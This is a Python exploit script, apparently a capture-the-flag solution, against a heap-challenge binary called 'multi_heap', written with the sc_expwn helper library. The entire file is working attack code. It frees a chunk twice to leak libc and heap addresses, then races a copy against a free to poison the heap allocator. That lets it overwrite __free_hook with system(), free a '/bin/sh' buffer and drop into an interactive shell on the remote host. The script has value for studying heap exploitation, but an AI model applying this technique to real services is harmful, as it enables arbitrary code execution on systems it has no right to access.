#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './multi_heap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.19.so_remote')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    mh = MultiHeap(conn)

    mh.alloc(0x418) # 0
    mh.alloc(0x18)  # 1 -> 0
    mh.free(0) 
    mh.free(0)

    mh.alloc(0x418) # 0
    mh.alloc(0x18)  # 1

    addr_libc_mainarena = u(mh.write(0)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']

    addr_heap_base = u(mh.write(1)) - 0x122c0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    mh.alloc(0x80)  # 2
    mh.alloc(0x80)  # 3
    mh.read(2, p64(addr_libc_free_hook - 8))

    i = 0
    print 'Try :',
    while True:
        i += 1
        print str(i), 

        mh.race(3, 2, 8) # copy(3,2,8); free(3)

        mh.alloc(0x80)  # 3
        mh.alloc(0x80)  # 4

        mh.read(4, '/bin/sh\x00' + p64(addr_libc_system))
        mh.free(4)

        if not 'Done' in conn.recvuntil('Done', timeout=0.1):
            break
    print 'Done'

class MultiHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, size, thread = False):
        self.sendlineafter('Your choice: ', '1')
        self.sendlineafter('Which: ', 'char')
        self.sendlineafter('Size: ', str(size))
        self.sendlineafter('(m/t): ', 't' if thread else 'm')

    def free(self, idx):
        self.sendlineafter('Your choice: ', '2')
        self.sendlineafter('Index: ', str(idx))

    def write(self, idx):
        self.sendlineafter('Your choice: ', '3')
        self.sendlineafter('Index: ', str(idx))
        return self.recvuntil('\n====', drop=True)

    def read(self, idx, data):
        self.sendlineafter('Your choice: ', '4')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Size: ', str(len(data)))
        self.sendlineafter('Content: ', data)

    def copy(self, dst, src, size, thread = False):
        self.sendlineafter('Your choice: ', '5')
        self.sendlineafter('Src index: ', str(src))
        self.sendlineafter('Dst index: ', str(dst))
        self.sendlineafter('Size: ', str(size))
        self.sendlineafter('(y/n): ', 'y' if thread else 'n')

    def race(self, dst, src, size):
        self.send("5\n{}\n{}\n{}\ny\n2\n{}\n".format(src, dst, size, dst))


#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.interactive()

#==========
